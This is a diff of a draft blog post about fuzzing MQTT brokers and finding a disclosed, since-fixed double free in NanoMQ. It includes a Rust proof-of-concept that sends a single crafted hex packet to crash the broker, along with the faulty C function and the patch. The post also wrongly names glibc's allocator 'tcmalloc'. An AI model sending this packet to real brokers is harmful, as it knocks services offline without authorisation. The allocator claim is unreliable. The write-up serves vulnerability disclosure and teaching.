@@ -6,14 +6,19 @@ authorTwitter = "" #do not include @
 cover = ""  
 tags = ["C", "nanomq", "security", "fuzzing"]  
 keywords = ["C", "nanomq", "security", "fuzzing"]  
-description = "Why using Rust is a good idea"  
+description = "Discovery of a double free in a C MQTT broker and what can be done about it"  
 showFullContent = false  
 draft = true  
 +++  
 People often ask me why I use Rust for my projects. I usually answer that I like the language and that it is a good fit  
 for my use cases. But there is another reason: I came from C++, but I never really liked it. I always felt that it was  
-overly complex and it was really easy to make grave mistakes. So in this post I want to show you how I found a double  
+overly complex, and it was really easy to make grave mistakes. So in this post I want to show you how I found a double  
 free in NanoMQ, an MQTT broker written in C, and what we can learn from it.
+
+## Prerequisites
+I tried to keep this post as beginner friendly as possible, here is the short list of what you need to know:
+- Basic programming knowledge
+- Basic knowledge of pointers
 
 ## Introduction to Undefined Behavior
 Coming from a high-level language like Python or Java, you might not be familiar with the concept of undefined behavior.  
@@ -34,14 +39,19 @@ return 0;
 A simple overflow. And while when you run this code on your machine, it will probably print `1`, it is not guaranteed to  
 do so, however the compiler is allowed to assume that the value is bigger than 0 and optimize the code  
 accordingly(unless compiled with -fwrapv). And while this is just one example of UB in C/C++, there are many more.  
-Now what happens when the compiler optimizes the code in a way that is not intended by the programmer? Well all garuantees the language gives you are off, so
-[pretty much everything](https://blog.regehr.org/archives/213).
+Now what happens when the compiler optimizes the code in a way that is not intended by the programmer? Well all 
+garuantees the language gives you are off, so [pretty much everything](https://blog.regehr.org/archives/213).
 
 Here are some other examples of undefined behavior in C/C++:
-#todo
-Now there are many tools to detect all kinds of UB(the -ftrapv flag, valgrind)
-And the larger your codebase gets the harder it gets to spot this UB and even projects like the Linux kernel with really
-skilled developers and many eyes looking at the code have memory bugs in them.
+- Dividing by 0
+- Dereferencing a null pointer
+- Dereferencing a pointer to an object that has already been freed
+- Memory access out of bounds
+- Modifying a string literal
+
+Now there are many tools to detect all kinds of UB(the -ftrapv flag, valgrind etc.), but they are not perfect.
+And the larger your codebase gets, the harder it gets to spot this UB and even projects like the Linux kernel with really
+skilled developers and many eyes looking at the code have [memory bugs in them](https://www.linuxkernelcves.com/cves).
 ## The Fuzzing
 The project was very simple: Develop a simple MQTT Broker that is secure while also being fast. During the project
 we used fuzzing to find bugs in our code and test the security of the broker. Initially the plan was to use Honggfuzz, 
@@ -75,10 +85,12 @@ Couldn't you just fuzz a running MQTT broker?
 
 That's a great idea!
 
-So I searched for other fuzzers and found [FUME](https://github.com/PBearson/FUME-Fuzzing-MQTT-Brokers).
-FUME uses Markov Modeling to generate MQTT packets and then sends them to the broker.
-So it takes away the work of creating fuzzing harnesses for every broker and (at the cost of efficiency) allows you to 
-fuzz any MQTT broker(and it was also used to find a security vulnerability in Mosquitto!).
+So I searched for MQTT fuzzers and found [FUME](https://github.com/PBearson/FUME-Fuzzing-MQTT-Brokers)(AFL-net does not 
+support MQTT yet). FUME uses Markov Modeling to generate MQTT packets and then sends them to the broker using the sent 
+back data and optionally terminal output to discover new paths. So it takes away the work of creating fuzzing harnesses 
+for every broker and (at the cost of efficiency) allows you to fuzz any MQTT broker(and it was also used to find a 
+security vulnerability in Mosquitto!).
+
 So I started FUME and let it run with the following brokers:
 - MCloudTT(Rust)(our broker)
 - mosquitto(C)
@@ -86,6 +98,140 @@ So I started FUME and let it run with the following brokers:
 - EMQX(Erlang)
 - HiveMQ(Java)
 
-And after waiting a while...
-<TODO: Insert Image>
+And after waiting a while...(and forking [FUME](https://github.com/MCloudTT/FUME-Fuzzing-MQTT-Brokers) to fix some issues)
+![The crash](./images/crash.jpg)
 ## The Bug
+We found a potential double free in NanoMQ! If you read this far, take some rest. We've come a long way, and the Google 
+Cloud VMs did quite a bit of work for us.
+
+But what is a double free?
+
+%Coolduck says%
+A double free is when you free a pointer twice. This can lead to all kinds of problems, like the same memory being 
+allocated twice, because essentially the memory allocator gets corrupted.
+%coolduck%
+
+But why does the terminal output say `free(): double free detected in tcache 2`?
+
+%Cooduck says%
+Well glibc has a memory allocator called `tcmalloc`(since 2.29) which is used by default on Linux. And it has a feature called tcache, which is a
+per-thread cache for memory allocations. And when you free a pointer twice, it will be added to the tcache, and when you
+free it again, it will detect the double free and print the error message. 
+%coolduck%
+
+Now onto the bug itself. We quickly made a PoC and tested that it wasn't a false positive.
+```rust
+use std::io::{Read, Write};
+use std::net::TcpStream;
+// For this cargo script would be nice
+fn main() {
+    let hex_string = b"106000044d51545405c05d552215000f62635255646d5344597577625636321600064837464f784d1700190122ea23001976744e574850653830623463567866556b6e72745659447a58000e5634566c4f73363749645451464400065a3035634f3970047ae6ec007018cde58814260c316b33456f6d53567746720003324b564036cebbd23226001839696f717650733544556f6138734f2b513656674d3136701564325474724b42497458676a3861545451596b5176";
+    let decoded_buf = hex::decode(hex_string).unwrap();
+    let mut conn = TcpStream::connect("127.0.0.1:1883").unwrap();
+    conn.write_all(&decoded_buf).unwrap();
+    conn.flush().unwrap();
+    let mut read_buf = [0; 5096];
+    conn.read_exact(&mut read_buf).unwrap();
+    println!("Read bytes: {:?}", hex::encode(read_buf));
+}
+```
+And tested it on some other machines, where it crashed every time(except on Windows where it just didn't crash for some 
+reason). This can be quite bad because with a single packet, an unauthenticated attacker can crash the broker.
+
+Now onto the bug itself. Upon debugging the crash, we found that the crash happens in the function `property_free`:
+```c
+int  
+property_free(property *prop)  
+{  
+       property *head = prop;  
+       property *p;  
+  
+       while (head) {  
+              p    = head;  
+              head = head->next;  
+              if (p->data.is_copy) {  
+                     switch (p->data.p_type) {  
+                     case STR:  
+                            mqtt_buf_free(&p->data.p_value.str);  
+                            break;  
+                     case BINARY:  
+                            mqtt_buf_free(&p->data.p_value.binary);  
+                            break;  
+                     case STR_PAIR:  
+                            mqtt_kv_free(&p->data.p_value.strpair);  
+                            break;  
+                     default:  
+                            break;  
+                     }  
+              }  
+              free(p);
+              ^^^^ This crashes  
+              p = NULL;  
+       }  
+       return 0;  
+}
+```
+And upon running with valgrind we found that there are also some out of bounds reads in the lines above the free.
+
+So we reached out to the NanoMQ developers(on Github because NanoMQ has no security contact) and they were very quick to
+fix the bug. Here is the fix:
+```c
+if ((rv = read_uint16(&buf, packet_id)) != MQTT_SUCCESS) {  
++  *prop = NULL;  
+   return rv;  
+}  
+  
+if (length == 2 || proto_ver != MQTT_PROTOCOL_VERSION_v5) {  
++  *prop = NULL;  
+   return MQTT_SUCCESS;  
+}  
+  
+if ((rv = read_byte(&buf, reason_code)) != MQTT_SUCCESS) {  
++  *prop = NULL;   
+   return rv;  
+}
+if (check_properties(*prop) != SUCCESS) {  
+   property_free(*prop);  
++  *prop = NULL;  
+   return PROTOCOL_ERROR;  
+}
+```
+The error: Forgetting to set the pointer to NULL after freeing it. This is a common mistake in C, and it's really easy 
+to make. I'd like to remind you that these people are professional developers, and they still make these mistakes. So
+don't feel bad if you make them too.
+
+## How can this be prevented?
+There are many methods to avoid this bug: 
+- Use an Adress Sanitizer(ASAN) to detect the double free
+- Have an extensive Fuzzing setup although this does not detect every bug of course
+- Use a safe subset of C
+- Use a safe language
+
+For me personally, the solution is to use Rust as a safe language with essentially the same speed as C, with a lot of
+safety features built in and great syntax and tooling. But I'm not going to go into that here.
+
+You might've seen that MCloudTT was also fuzzed and marked as our broker. I am not here to advertise our broker, because
+it is not a replacement for any of the other brokers in comparison. It only implements a subset of MQTT v5, is not 
+MQTT v3 compatible and does not support wildcards.
+
+However, while it is not even performance oriented or optimised, it is still faster than Brokers written in 
+garbage-collected Languages like Java and is not performance-wise far behind the C brokers.
+Here are the benchmarks:
+![Benchmarks](./images/boxplot.png)
+Note here that the average speed was really similar between the native brokers, the full results can be found
+[here](/static/broker_benchmarks.html)
+## Conclusion
+So... Rewrite all low-level software in Rust? No, of course not.
+But as [Azure's CTO Mark Russinovich said:](https://twitter.com/markrussinovich/status/1571995117233504257)
+
+"*Speaking of languages, it's time to halt starting any new projects in C/C++ and use Rust for those scenarios where a 
+non-GC language is required. For the sake of security and reliability. the industry should declare those languages as 
+deprecated.*"
+
+I largely agree with that sentiment and wouldn't start a new project in C or C++ unless I really had to. And security
+critical components C/C++ software can be rewritten in Rust, because [unlike languages like Go](https://dave.cheney.net/2016/01/18/cgo-is-not-go) 
+it plays nice with other languages and has a great FFI. This is also the reason Linux now allows for [Rust modules in the
+kernel](https://lwn.net/Articles/908347/).
+
+I hope you enjoyed this writeup and learned something from it. If you have any questions, feel free to reach out to me
+on Mastodon, Reddit or Github.
